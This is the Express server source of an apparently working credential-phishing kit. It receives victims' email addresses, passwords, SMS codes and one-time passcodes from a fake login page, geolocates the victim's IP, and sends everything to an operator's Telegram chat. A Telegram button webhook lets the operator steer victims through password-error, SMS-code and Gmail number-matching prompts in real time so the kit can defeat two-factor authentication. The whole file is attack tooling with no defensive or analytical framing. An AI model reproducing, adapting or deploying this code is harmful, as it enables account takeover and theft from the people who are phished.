require('dotenv').config();
const express = require("express");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());
app.use((req, res, next) => {
  res.setHeader("Bypass-Tunnel-Reminder", "true");
  next();
});

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

console.log("BOT_TOKEN", BOT_TOKEN);
console.log("CHAT_ID", CHAT_ID);

let routingDecision = null;

// ─────────────────────────────────────────────
// ROUTE 1: Frontend submits email + password
// ─────────────────────────────────────────────
app.post("/submit", async (req, res) => {
  try {
    const { email, password, provider } = req.body;
    console.log("request body ==--==", req.body);

    const rawIp = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const ip = rawIp === "::1" ? null : rawIp.replace(/^::ffff:/, "");
    console.log("got ip address ==--==", ip);

    const userAgent = req.headers["user-agent"] || "Unknown device";

    let location = "?, ?, ?";
    let latitude = "?";
    let longitude = "?";

    if (ip) {
      try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
        const text = await geoRes.text(); // read as text first
        if (text) {
          const geo = JSON.parse(text);
          console.log("location from ip ==--==", geo);
          if (geo.status === "success") {
            location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
            latitude = geo.lat;
            longitude = geo.lon;
          }
        }
      } catch (geoError) {
        console.log("geo lookup failed, continuing:", geoError.message);
        // location stays as "?, ?, ?" — message still sends
      }
    }

    console.log("location ==--==", location);

    const message =
        `🔔 *New Submission*\n\n` +
        `📮 *Provider:* ${provider}\n` +
        `📧 *Email:* ${email}\n` +
        `🔑 *Password:* ${password}\n\n` +
        `🌍 *Location:* ${location}\n` +
        `📍 *Coordinates:* ${latitude}, ${longitude}\n` +
        `🖥️ *Device:* ${userAgent}\n` +
        `🌐 *IP Address:* ${ip || "localhost"}`;

    console.log("message built ==--==", message);

    const telegramBody = {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML",
    };

    console.log("body set up {}",telegramBody);

    if (provider === "GMAIL") {
      telegramBody.reply_markup = {
        inline_keyboard: [
          [
            { text: "✅ Yes - Prompt", callback_data: "yes-prompt" },
            { text: "❌ Password error", callback_data: "password-error" },
          ],
          [
            { text: "📱 SMS Code", callback_data: "sms-code" },
            { text: "📞 Number Prompt", callback_data: "number-prompt" },
          ],
          [
            { text: "✅ Success ", callback_data: "success" },
          ],
        ],
      };
      console.log("reply markup {}",telegramBody.reply_markup);
    }

    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(telegramBody),
    });

    const telegramData = await telegramRes.json();
    console.log("telegram response ==--==", telegramData);


    res.json({ success: true, message: "Submitted successfully" });
  } catch (error) {
    console.error("Error in /submit:", error);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

// ─────────────────────────────────────────────
// ROUTE 2: Frontend submits SMS code
// ─────────────────────────────────────────────
app.post("/submit-code", async (req, res) => {
  try {
    const { email, code } = req.body;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `🔐 *SMS Code Submitted*\n\n📧 *Email:* ${email}\n🔑 *Code:* ${code}`,
        parse_mode: "HTML",
      }),
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error in /submit-code:", error);
    res.status(500).json({ success: false });
  }
});

// ─────────────────────────────────────────────
// ROUTE 3: Telegram webhook — receives button clicks
// ─────────────────────────────────────────────
app.post("/webhook", async (req, res) => {
  const body = req.body;
  console.log("webhook received ==--==", JSON.stringify(body));

  if (body.callback_query) {
    const data = body.callback_query.data;
    const messageId = body.callback_query.message.message_id;
    console.log("Telegram decision received:", data);

    if (data === "number-prompt") {
      // Build 1-100 grid and edit the same message
      const rows = [];
      for (let i = 1; i <= 100; i += 10) {
        const row = [];
        for (let j = i; j < i + 10 && j <= 100; j++) {
          row.push({ text: `${j}`, callback_data: `show-number:${j}` });
        }
        rows.push(row);
      }

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          message_id: messageId,
          reply_markup: { inline_keyboard: rows },
        }),
      });

    } else if (data.startsWith("show-number:")) {
      const number = data.split(":")[1];
      routingDecision = `number-prompt:${number}`;

      // Edit message back to original 4 buttons, showing picked number
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          message_id: messageId,
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Yes - Prompt", callback_data: "yes-prompt" },
                { text: "❌ Password error", callback_data: "password-error" },
              ],
              [
                { text: "📱 SMS Code", callback_data: "sms-code" },
                { text: `📞 Number Prompt (${number})`, callback_data: "number-prompt" },
              ],
                [
                 { text: "✅ Success", callback_data: "success" },
                ]
            ],
          },
        }),
      });

    } else {
      routingDecision = data;
    }

    // Acknowledge the button tap
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: body.callback_query.id,
        text: `Decision: ${data}`,
      }),
    });
  }

  res.sendStatus(200);
});

// ─────────────────────────────────────────────
// ROUTE 4: Frontend polls for Telegram decision
// ─────────────────────────────────────────────
// ROUTE 4 in server.js
app.get("/check-decision", (req, res) => {
  const decision = routingDecision;
  res.json({ decision });
  if (decision !== null) {
    setTimeout(() => {
      routingDecision = null;
    }, 6000); // ← increase to 6 seconds to avoid race condition
  }
});

app.post("/submit-otp", async (req, res) => {
  try {
    const { email, otp, provider } = req.body;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `🔑 *OTP Submitted*\n\n📮 *Provider:* ${provider}\n📧 *Email:* ${email}\n🔐 *OTP:* ${otp}`,
        parse_mode: "HTML",
      }),
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error in /submit-otp:", error);
    res.status(500).json({ success: false });
  }
});

// ─────────────────────────────────────────────
// START SERVER
// ─────────────────────────────────────────────
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});



// ─────────────────────────────────────────────
// NOTIFY INCOMING REQUEST
// ─────────────────────────────────────────────
app.post("/notify-incoming", async (req, res) => {
  try {
    const { provider } = req.body;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `👀 <b>Incoming submission from ${provider}</b>`,
        parse_mode: "HTML",
      }),
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error in /notify-incoming:", error);
    res.status(500).json({ success: false });
  }
});